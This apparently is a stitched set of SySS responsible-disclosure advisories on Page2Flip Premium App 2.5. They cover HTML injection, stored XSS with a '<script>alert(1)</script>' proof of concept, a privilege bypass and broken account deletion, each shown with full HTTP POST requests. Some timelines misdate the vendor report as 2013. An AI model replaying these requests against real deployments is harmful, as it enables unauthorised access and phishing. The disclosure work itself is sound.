The Page2Flip application is vulnerable to HTML injection attacks. This
allows users to send e-mails with almost any content to another user in
the name of the Page2Flip team.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Vulnerability Details:
The SySS GmbH identified a vulnerability in the ""create user""
functionality of the Page2Flip application.
At least the parameters ""first name"" and ""last name"" are not sanitized
sufficiently resulting in the possibility to inject arbitrary HTML code
that changes the content of the ""your registration"" e-mail. This HTML
e-mail is sent to the given e-mail address of a newly created user
account.
The described cross-site scripting vulnerability can be exploited in the
context of an authenticated administrative user and allows an attacker
to send an e-mail with almost any content in the name of the Page2Flip
team to the victim.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Proof of Concept (PoC):
The following HTTP POST request using the HTML code
""<div+style=""display:none;"">"" as the value for the parameter ""nachname""
demonstrates that HTML code can be injected:
POST /settings/users HTTP/1.1
Host: [host]
Faces-Request: partial/ajax
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Content-Length: 1198
Cookie: [cookies]
accountEditForm=accountEditForm&javax.faces.ViewState=4267992298149872508%3A938284134061579979&ice.window=9aibbsfanj&ice.view=vvgml70uz&accountEditForm%3Aanrede=xxx&accountEditForm%3Avorname=%3Cdiv%20style%3D%22display%3Anone%3B%22%3E&accountEditForm%3Anachname=xxx&accountEditForm%3Aemail=xxx&accountEditForm%3Apassword=xxx&icefacesCssUpdates=&javax.faces.source=accountEditForm%3AsubmitBtn%3AsubmitBtn&javax.faces.partial.event=click&javax.faces.partial.execute=%40all&javax.faces.partial.render=%40all&ice.window=9aibbsfanj&ice.view=vvgml70uz&ice.focus=accountEditForm%3AsubmitBtn%3AsubmitBtn&accountEditForm%3AsubmitBtn%3AsubmitBtn=Save&ice.event.target=accountEditForm%3AsubmitBtn%3AsubmitBtn&ice.event.captured=accountEditForm%3AsubmitBtn%3AsubmitBtn&ice.event.type=onclick&ice.event.alt=false&ice.event.ctrl=false&ice.event.shift=false&ice.event.meta=false&ice.event.x=1251&ice.event.y=780&ice.event.left=true&ice.event.right=false&ice.submit.type=ice.s&ice.submit.serialization=form&javax.faces.partial.ajax=true
The HTML e-mail source code of the resulting e-mail of the PoC contains
the following HTML code
Hello <div style=""display:none;""> xxx <br>
rendering all subsequent automatically added content invisible.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Solution:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclosure Timeline:
2015-06-23: Vulnerability discovered
2015-06-29: Vulnerability reported to vendor
2015-07-07: Reported vulnerabilities again as the vendor did not respond
to the first e-mail
2015-07-14: Reminder sent concerning reported vulnerabilities
2015-08-24: Public release of security advisory according to the SySS
Responsible Disclosure Policy
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
References:
[1] Page2Flip homepage
http://page2flip.de/
[2] SySS Responsible Disclosure Policy
https://www.syss.de/en/news/responsible-disclosure-policy/
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Credits:
This security vulnerability was found by Dr. Erlijn van Genuchten of the
SySS GmbH.
E-Mail: erlijn.vangenuchten syss de
Public Key: https://www.syss.de/fileadmin/dokumente/Materialien/PGPKeys/Erlijn_vanGenuchten.asc
Key ID: 0xBD96FF2A
Key Fingerprint: 17BB 4CED 755A CBB3 2D47 C563 0CA5 8637 BD96 FF2A
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclaimer:
The information provided in this security advisory is provided ""as is""
and without warranty of any kind. Details of this security advisory may
be updated in order to provide as accurate information as possible. The
latest version of this security advisory is available on the SySS Web
site.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Copyright:
Creative Commons - Attribution (by) - Version 3.0
URL: http://creativecommons.org/licenses/by/3.0/deed.en
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1
iQIcBAEBCgAGBQJV2x3zAAoJEAylhje9lv8qej0P/3vmT0I5h5viJz3OMZcfJih7
stRgXEsGc2el0Kz3HN7e9lBO5S+llnD2WP4IobskLtwZsKmD2CaOO9EHiIRiVzo5
k4fQ6RqLlHczOS8prxGM0ZPOzBgUcRf4xa4X3g+GG0lnq6S7CYPp58ni1N8hSQMJ
EwL0m7klsNEoi0Z/va3y3F/PONhzvSqSgUXbL9tgs4ZdWbRxTGremiN5YRqcfWxG
qTv1RZeKKC135oQxdJ/+2wnTNV3ks2IWpuslMLdcXPBkXVZKKzUGW2xYCTP48uLX
FpclVqsMnSmT34BkNUh9c8H4yE5B3/VzpTrOHN32uN5smnu/M6aMlLYaqBfWCnCp
ucYzjtMLRCY3VtygWOyhG0yFg6MnqUH34TfUz32rdywuMalrf+Kuu2Xx8NN139aC
r3RdHiDdcrSUADVHBhGM/dvwlCopqrRGBqsD1CqlEKI3gtEBxLdSU+aTKRzXJoX+
mwprFZUFirQajSAkcUhwFZ4PLzsrsIUdqflDb7DfT1lQY8gDuOMidfHwpb2rpMzc
UtKawbtC8yok94E4ukJ5n+J1qrslT/nTxRT646hjSoXcDUEpitdPLUITlV2A0Rb7
L/EmpTEhHhepOCVY0DNegxI4nsD73bZwKmQy+u+Tvm7o0wt0B/2NCaD4v9qQeYPf
KzxWcd/kOrAx5b+WrctN
=abcn
-----END PGP SIGNATURE-----"
4267,[SYSS-2015-028] Cross-Site Scripting (CWE-79) in Page2Flip Premium App 2.5,CWE-79,,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512
Advisory ID: SYSS-2015-028
Product: Page2Flip
Vendor: w!ssenswerft GmbH
Affected Version(s): Premium App 2.5, probably also in Business App
and Basic App, and in lower versions
Tested Version(s): Premium App 2.5
Vulnerability Type: Cross-Site Scripting (CWE-79)
Risk Level: High
Solution Status: Open
Vendor Notification: 2015-06-29
Solution Date:
Public Disclosure:
CVE Reference: Not yet assigned
Author of Advisory: Dr. Erlijn van Genuchten (SySS GmbH)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Overview:
With the Page2Flip Web application, it is possible to create e-papers in
PDF format that can be flicked through digitally. Such e-papers can be
used for magazines, catalogues, flyers, etc. (see [1]).
The Page2Flip application is vulnerable to Persistent Cross-Site
Scripting so that administrative users can attack other administrative
users or users with fewer privileges.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Vulnerability Details:
The SySS GmbH identified a persistent cross-site scripting vulnerability
in the Page2Flip Premium App.
At least the parameters ""first name"" and ""last name"" are not sanitized
sufficiently resulting in a persistent cross-site scripting
vulnerability.
This reflected cross-site scripting vulnerability can be exploited in
the context of an authenticated user by storing script code in one of
these fields.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Proof of Concept (PoC):
The following HTTP POST request using the JavaScript code
""<script>alert(1)</script>"" as the value for the parameter ""nachname""
demonstrates the persistent cross-site scripting vulnerability by
showing a JavaScript alert box as soon as this user has logged on:
POST /settings/users HTTP/1.1
Host: <host>
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Content-Length: 1239
Cookie: <cookies>
accountEditForm=accountEditForm&javax.faces.ViewState=437392726575022409%3A-3508488346630943554&ice.window=9aib95sifa&ice.view=vvgml70d9&accountEditForm%3Aanrede=xxx&accountEditForm%3Avorname=xxx&accountEditForm%3Anachname=xxx%3Cscript%3Ealert(1)%3C%2Fscript%3E&accountEditForm%3Aemail=xxx&accountEditForm%3Apassword=xxx&accountEditForm%3Arights=ROLE_ADMINISTRATE_USER&accountEditForm%3Arights=ROLE_PUBLISH_DOCUMENTS&accountEditForm%3Arights=ROLE_CHANGE_SETTINGS&accountEditForm%3Arights=ROLE_CREATE_CUSTOMER&icefacesCssUpdates=&javax.faces.source=accountEditForm%3AsubmitBtn%3AsubmitBtn&javax.faces.partial.event=click&javax.faces.partial.execute=%40all&javax.faces.partial.render=%40all&ice.window=9aib95sifa&ice.view=vvgml70d9&ice.focus=accountEditForm%3AsubmitBtn%3AsubmitBtn&accountEditForm%3AsubmitBtn%3AsubmitBtn=Save&ice.event.target=accountEditForm%3AsubmitBtn%3AsubmitBtn&ice.event.captured=accountEditForm%3AsubmitBtn%3AsubmitBtn&ice.event.type=onclick&ice.event.alt=false&ice.event.ctrl=false&ice.event.shift=false&ice.event.meta=false&ice.event.x=1281&ice.event.y=752&ice.event.left=true&ice.event.right=false&ice.submit.type=ice.s&ice.submit.serialization=form&javax.faces.partial.ajax=true
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Solution:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclosure Timeline:
2015-06-23: Vulnerability discovered
2013-06-29: Vulnerability reported to vendor
2015-07-07: Reported vulnerabilities again as the vendor did not respond
to the first e-mail
2015-07-14: Reminder sent concerning reported vulnerabilities
2015-08-24: Public release of security advisory according to the SySS
Responsible Disclosure Policy
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
References:
[1] Page2Flip homepage
http://page2flip.de/
[2] SySS Responsible Disclosure Policy
https://www.syss.de/en/news/responsible-disclosure-policy/
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Credits:
This security vulnerability was found by Dr. Erlijn van Genuchten of the
SySS GmbH.
E-Mail: erlijn.vangenuchten syss de
Public Key: https://www.syss.de/fileadmin/dokumente/Materialien/PGPKeys/Erlijn_vanGenuchten.asc
Key ID: 0xBD96FF2A
Key Fingerprint: 17BB 4CED 755A CBB3 2D47 C563 0CA5 8637 BD96 FF2A
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclaimer:
The information provided in this security advisory is provided ""as is""
and without warranty of any kind. Details of this security advisory may
be updated in order to provide as accurate information as possible. The
latest version of this security advisory is available on the SySS Web
site.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Copyright:
Creative Commons - Attribution (by) - Version 3.0
URL: http://creativecommons.org/licenses/by/3.0/deed.en
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1
iQIcBAEBCgAGBQJV2x3sAAoJEAylhje9lv8qTP8QAK2z/18lni4UnWo3RElmM+/c
CiaqysnydDIvREm2Px36HQjeUDrYA35pZZhxi742E/flMhGw2/aH1gdVtmB6K7ai
qnIvStXOIMVul7IGhuHsOn+W7k7IfRx4726VGVoWNyUFoLmn5azU6/OqY+2ql6fH
rh/RfdKt8Lp2Q0KSdZy7Le3Il7hJX7YRoD8O/uECI7U2MtVwWJQg/zfK1y9+zFpP
Z7v55GMWRDZ4UWin6Fgps3ayVqdnmwUOo0R8xIkn9HU5j7S89QT+nRBE46FLO4ED
ZidsWxTeoUS75COcWsuCWVJXsse4KpdDSBVfIPoRG9OUU5s081OuDXHApZGYVlZb
lHlmVwjtyIGXUe5vecdCzjY4rk+C3nWwnr9Tew4QNtzg3NdPfugrpNeyBGFeVcu6
749ojAkzcGbFToEvbYBehBsbnNFq1DbUuLTkib+TCmM36/UZiZRZ9rnVS1T4e7Z3
r6fSlYVmFT19j4KfyucDvLv1XVsj4AJ77YI51xlRvnDEJkmQd3pvGfixZJ3n0Gse
eY9l7398jSzMMv+ePZ2eDWFomt23+tNODROy/ST9n15avYi2WlNb3aai86CdGnqZ
bstvEc7NTVyMotWmfYmbWidqMiCI4toB9ZAUMVlEUKTKMLQp6vUZe8lUiOpjNczE
0vOmqRgHRAff0wPtjo1I
=rzEs
-----END PGP SIGNATURE-----"
4268,[SYSS-2015-029] Insecure Direct Object Reference (CWE-932) in Page2Flip Premium App 2.5,CWE-932,,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512
Advisory ID: SYSS-2015-029
Product: Page2Flip
Vendor: w!ssenswerft GmbH
Affected Version(s): Premium App 2.5, probably also in Business App
and Basic App, and in lower versions
Tested Version(s): Premium App 2.5
Vulnerability Type: Insecure Direct Object Reference (CWE-932)
Risk Level: Medium
Solution Status: Open
Vendor Notification: 2015-06-29
Solution Date:
Public Disclosure:
CVE Reference: Not yet assigned
Author of Advisory: Dr. Erlijn van Genuchten (SySS GmbH)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Overview:
With the Page2Flip Web application, it is possible to create e-papers in
PDF format that can be flicked through digitally. Such e-papers can be
used for magazines, catalogues, flyers, etc. (see [1]).
The Page2Flip application allows preview content to be accessed by
unauthenticated users.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Vulnerability Details:
The SySS GmbH identified a vulnerability in the ""preview"" functionality
of the Page2Flip application.
Pageflip preview content can be accessed by unauthenticated users if
a valid URL is known.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Proof of Concept (PoC):
By knowing or guessing a valid URL for pageflip preview content, an
unauthenticated user can access this data.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Solution:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclosure Timeline:
2015-06-23: Vulnerability discovered
2015-06-29: Vulnerability reported to vendor
2015-07-07: Reported vulnerabilities again as the vendor did not respond
to the first e-mail
2015-07-14: Reminder sent concerning reported vulnerabilities
2015-08-24: Public release of security advisory according to the SySS
Responsible Disclosure Policy
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
References:
[1] Page2Flip homepage
http://page2flip.de/
[2] SySS Responsible Disclosure Policy
https://www.syss.de/en/news/responsible-disclosure-policy/
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Credits:
This security vulnerability was found by Dr. Erlijn van Genuchten of the
SySS GmbH.
E-Mail: erlijn.vangenuchten syss de
Public Key: https://www.syss.de/fileadmin/dokumente/Materialien/PGPKeys/Erlijn_vanGenuchten.asc
Key ID: 0xBD96FF2A
Key Fingerprint: 17BB 4CED 755A CBB3 2D47 C563 0CA5 8637 BD96 FF2A
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclaimer:
The information provided in this security advisory is provided ""as is""
and without warranty of any kind. Details of this security advisory may
be updated in order to provide as accurate information as possible. The
latest version of this security advisory is available on the SySS Web
site.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Copyright:
Creative Commons - Attribution (by) - Version 3.0
URL: http://creativecommons.org/licenses/by/3.0/deed.en
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1
iQIcBAEBCgAGBQJV2x3jAAoJEAylhje9lv8qq3oP/RfufC/hsQJ/VYU/wixiu5/u
47AfN3p+JwqRF70glzNxm4cnDSl4uN0nQE0i3KFXvQ+ykr0IAMtj0/WBcNfqQ4z9
Dwn09k/YrBZ4gTUycRksrd+YchWD8GFQqJK+gw7wduqe/YnPrFVC4N1GLr3PsFNk
EF95rLrQSYT4BtAzIAIGUau3dgDIR1/dNRHL6lEreXDbDIzsTitoN5FFUpyv60s9
FENgi9aUTLqumD35eEaon/OBsIrvb5iqMuxZIrouyOC/l20tVolNq4Szjr0HnVTm
AWUT4+Ek1tojVWaXruaAgb5bk/VxoMp/BHjk6KofqyWypoAUuavwkP7z2OKLsc+6
vavHhXimwm5MVLXkMAy6Y9Exq6gn0zjr4j3upaunw3z9QIVmnGWxyFFqbvEs168z
S5Kua+bWpK8cz1398xzeC2BGFSO6vFLzy9w6OlgRvIZJF5JyXMvxGMNv/JKzBPvG
eEo0cCCCIYWAzo08QByVGu44Q/62oGoBI2hKPmKpRFlc3n5SKwMSQOHkI4CWJNDY
HsLhw/fqgmKvU/CcG44yKjIBAH1EqNvK5MU9w7yzZv4DJ78zcxZCj5xua83EOujC
P49BBIyRCcXpD+mAj95vfc2k/lWi9zc5NqPNDma+9YRcIqDxDS/VGgHDFMLwo57i
gTFe4C5ewUawBrcaAPFc
=y0ne
-----END PGP SIGNATURE-----"
4269,[SYSS-2015-030] Improper Handling of Insufficient Privileges (CWE-274) in Page2Flip Premium App 2.5,CWE-274,,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512
Advisory ID: SYSS-2015-030
Product: Page2Flip
Vendor: w!ssenswerft GmbH
Affected Version(s): Premium App 2.5, probably also in Business App
and Basic App, and in lower versions
Tested Version(s): Premium App 2.5
Vulnerability Type: Improper Handling of Insufficient Privileges (CWE-274)
Risk Level: High
Solution Status: Open
Vendor Notification: 2015-06-29
Solution Date:
Public Disclosure:
CVE Reference: Not yet assigned
Author of Advisory: Dr. Erlijn van Genuchten (SySS GmbH)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Overview:
With the Page2Flip Web application, it is possible to create e-papers in
PDF format that can be flicked through digitally. Such e-papers can be
used for magazines, catalogues, flyers, etc. (see [1]).
The Page2Flip application allows users who are not privileged to publish
documents to nevertheless publish documents.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Vulnerability Details:
The SySS GmbH identified a vulnerability in the ""publish"" functionality
of the Page2Flip application.
Users who are not allowed to publish documents are nevertheless able to
do so.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Proof of Concept (PoC):
The following HTTP POST request was sent by a user who did not possess
the privilege to publish documents.
POST /catalog/[catalog id]/publishview HTTP/1.1
Host: [host]
Faces-Request: partial/ajax
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Content-Length: 1132
Cookie: [cookies]
downloadDialogForm=downloadDialogForm&javax.faces.ViewState=-8995724769283342270%3A-6610202228620183009&ice.window=9aibc007ll&ice.view=vvgml70v8&downloadDialogForm%3Ard_releaseTypeDownload=ext_catalog&downloadDialogForm%3Aj_idt916=Please%20choose...&icefacesCssUpdates=&javax.faces.source=downloadDialogForm%3AdownloadDialogForm_submit%3AdownloadDialogForm_submit&javax.faces.partial.event=click&javax.faces.partial.execute=%40all&javax.faces.partial.render=%40all&ice.window=9aibc007ll&ice.view=vvgml70v8&ice.focus=downloadDialogForm%3AdownloadDialogForm_submit%3AdownloadDialogForm_submit&downloadDialogForm%3AdownloadDialogForm_submit%3AdownloadDialogForm_submit=Start%20download&ice.event.target=downloadDialogForm%3AdownloadDialogForm_submit%3AdownloadDialogForm_submit&ice.event.captured=downloadDialogForm%3AdownloadDialogForm_submit%3AdownloadDialogForm_submit&ice.event.type=onclick&ice.event.alt=false&ice.event.ctrl=false&ice.event.shift=false&ice.event.meta=false&ice.event.x=1169&ice.event.y=796&ice.event.left=true&ice.event.right=false&ice.submit.type=ice.s&ice.submit.serialization=form&javax.faces.partial.ajax=true
After sending this request, the user received an e-mail stating ""You can
download your pageflip!"".
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Solution:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclosure Timeline:
2015-06-23: Vulnerability discovered
2013-06-29: Vulnerability reported to vendor
2015-07-07: Reported vulnerabilities again as the vendor did not respond
to the first e-mail
2015-07-14: Reminder sent concerning reported vulnerabilities
2015-08-24: Public release of security advisory according to the SySS
Responsible Disclosure Policy
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
References:
[1] Page2Flip homepage
http://page2flip.de/
[2] SySS Responsible Disclosure Policy
https://www.syss.de/en/news/responsible-disclosure-policy/
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Credits:
This security vulnerability was found by Dr. Erlijn van Genuchten of the
SySS GmbH.
E-Mail: erlijn.vangenuchten syss de
Public Key: https://www.syss.de/fileadmin/dokumente/Materialien/PGPKeys/Erlijn_vanGenuchten.asc
Key ID: 0xBD96FF2A
Key Fingerprint: 17BB 4CED 755A CBB3 2D47 C563 0CA5 8637 BD96 FF2A
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclaimer:
The information provided in this security advisory is provided ""as is""
and without warranty of any kind. Details of this security advisory may
be updated in order to provide as accurate information as possible. The
latest version of this security advisory is available on the SySS Web
site.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Copyright:
Creative Commons - Attribution (by) - Version 3.0
URL: http://creativecommons.org/licenses/by/3.0/deed.en
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1
iQIcBAEBCgAGBQJV2x3WAAoJEAylhje9lv8qUMIP/RA5OqFVpM4ch+CLyOq2YMJq
WHVZmKmHLp4igu90ycqfALonph+x65Slfa2etUeyn/r1njAOSEW23VAJUcNdvKYT
fL/ZxNhTMcfnfgTpldW742tloJk462pLoNPEY9Rt1jmzHKHDehyKXJTkTN/T+mjI
prZyfPjRQgTR9iDH/iNnGfSyito5ZWvOwHNswXxZU1q65RfEr0k9QcENF//PraR1
gFYjE2zxsBeyzatBjL6yfB9BNfV/wjiao8rm3aUI22fL+rJWkL5tVSVKWOrFnTgq
KFHtRmGvZDo+uJbM+g+/B4MYcNTPaooLPG4i3XOhdMwcmWPk9mR7mMkLV6tN886S
r8Hz/76PKtysi2aU+nO1hlh9BGxrEwie+T0YvcSAAfoDRgvvVrHLshcr1pGlcvy/
pAjmUVKiNwjw2WMoJOM9f8N42Hp2SeirSRAT4aLi64XV3ntoRwaEZt4sELS+TzSh
5fUf0dpCzgh45oNk+oiWM8obhq36nAXAUF7ePl1kv7/SzX/J//jd3ih8XYccT4jr
8VI6K1Txlveditd5ZK6ocBvCQKpWregQFD8vq3ZZTAM3aGCkPgzSGOUMpalaZ6JQ
VwvSRiYZP0FVxKxfqQjge+oqkf4MDuh8821TJ5rrzZ3gODKITfabIsaS4YqB7aMT
rJvhOlngmtxslFDRUaDI
=PpOx
-----END PGP SIGNATURE-----"
4270,[SYSS-2015-032] Broken Authentication and Session Management (CWE-930) in Page2Flip Premium App 2.5,CWE-930,,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512
Advisory ID: SYSS-2015-032
Product: Page2Flip
Vendor: w!ssenswerft GmbH
Affected Version(s): Premium App 2.5, probably also in Business App
and Basic App, and in lower versions
Tested Version(s): Premium App 2.5
Vulnerability Type: Broken Authentication and Session Management (CWE-930)
Risk Level: High
Solution Status: Open
Vendor Notification: 2015-06-29
Solution Date:
Public Disclosure:
CVE Reference: Not yet assigned
Author of Advisory: Dr. Erlijn van Genuchten (SySS GmbH)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Overview:
With the Page2Flip Web application, it is possible to create e-papers in
PDF format that can be flicked through digitally. Such e-papers can be
used for magazines, catalogues, flyers, etc. (see [1]).
The Page2Flip app allows users to log in with valid credentials, even
when their user accounts have been deleted.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Vulnerability Details:
The SySS GmbH was as an administrative user able to delete user accounts.
However, these users were after that still able to login with their
credentials when following the normal login procedure.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Proof of Concept (PoC):
Create a user account with known credentials, delete this account and
login with these credentials.
The POST request for deleting a user is:
POST /settings/users HTTP/1.1
Host: [host]
Faces-Request: partial/ajax
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Content-Length: 1042
Cookie: [cookies]
form_userSettings=form_userSettings&javax.faces.ViewState=-5924384961489816147%3A2243478473205355579&ice.window=9aib95sifa&ice.view=vvgml70e1&icefacesCssUpdates=&form_userSettings%3Aj_idcl=form_userSettings%3AuserTable%3A0%3AdeleteAccount%3Aactionicon&javax.faces.source=form_userSettings%3AuserTable%3A0%3AdeleteAccount%3Aactionicon&javax.faces.partial.event=click&javax.faces.partial.execute=%40all&javax.faces.partial.render=%40all&ice.window=9aib95sifa&ice.view=vvgml70e1&ice.focus=form_userSettings%3AuserTable%3A0%3AdeleteAccount%3Aactionicon&form_userSettings%3AuserTable%3A0%3AdeleteAccount%3Aactionicon=form_userSettings%3AuserTable%3A0%3AdeleteAccount%3Aactionicon&ice.event.target=bimg&ice.event.captured=form_userSettings%3AuserTable%3A0%3AdeleteAccount%3Aactionicon&ice.event.type=onclick&ice.event.alt=false&ice.event.ctrl=false&ice.event.shift=false&ice.event.meta=false&ice.event.x=1368&ice.event.y=373&ice.event.left=true&ice.event.right=false&ice.submit.type=ice.s&ice.submit.serialization=form&javax.faces.partial.ajax=true
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Solution:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclosure Timeline:
2015-06-23: Vulnerability discovered
2013-06-29: Vulnerability reported to vendor
2015-07-07: Reported vulnerabilities again as the vendor did not respond
to the first e-mail
2015-07-14: Reminder sent concerning reported vulnerabilities
2015-08-24: Public release of security advisory according to the SySS
Responsible Disclosure Policy
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
References:
[1] Page2Flip homepage
http://page2flip.de/
[2] SySS Responsible Disclosure Policy
https://www.syss.de/en/news/responsible-disclosure-policy/
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Credits:
Security vulnerability found by Responsible Hacker of the SySS GmbH.
E-Mail: erlijn.vangenuchten syss de
Public Key: https://www.syss.de/fileadmin/dokumente/Materialien/PGPKeys/Erlijn_vanGenuchten.asc
Key ID: 0xBD96FF2A
Key Fingerprint: 17BB 4CED 755A CBB3 2D47 C563 0CA5 8637 BD96 FF2A
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclaimer:
The information provided in this security advisory is provided ""as is""
and without warranty of any kind. Details of this security advisory may
be updated in order to provide as accurate information as possible. The
latest version of this security advisory is available on the SySS Web
site.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Copyright:
Creative Commons - Attribution (by) - Version 3.0
URL: http://creativecommons.org/licenses/by/3.0/deed.e
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1
iQIcBAEBCgAGBQJV2x28AAoJEAylhje9lv8q/egP/0vkbb4a+ku5dw/cv9Hx69Ui
H0bdz1OrSrCQ9z1jXH8/b3mps4ZDxV87NNgxFyY0Z2DUp36JEIhdi/GpdgUUFPm4
XIe7J1u3HJ6z4M0PEWrFE/Uwx7stQi3nWAhXKKAL66ZwdT6nKlnHOmGTXf2EggS1
zvmd7nJkMPIfFZ0f1MEbAVMs90ofBqZlTEnB5Nv5sZVHyFnMdTMdfvgp5Xx4kNg/
ZYQqi/v2v3Zj79TfN0GPRJ+iWBfzinMVOnjLIRiX0i5+z99L5sQO7eELmQxiwbcm
4zq3smCGDSprguV5+WBarlH1uNGh+E6Rhfn3GkqkPpK622q6dkRSyzfDZ92Cqc6t
YBLohkR/ypy/HNLOTefG4IOagwWIBzsPlk1W6bMOF1nUdqLW0DqDRsV5Toh2Qv6T
n0ctOhTmEBi1vVGxEzGEjFgqjADuzXWpPVimZ/Zum4v2MgfN3QYAtkLTDaHIZMMB
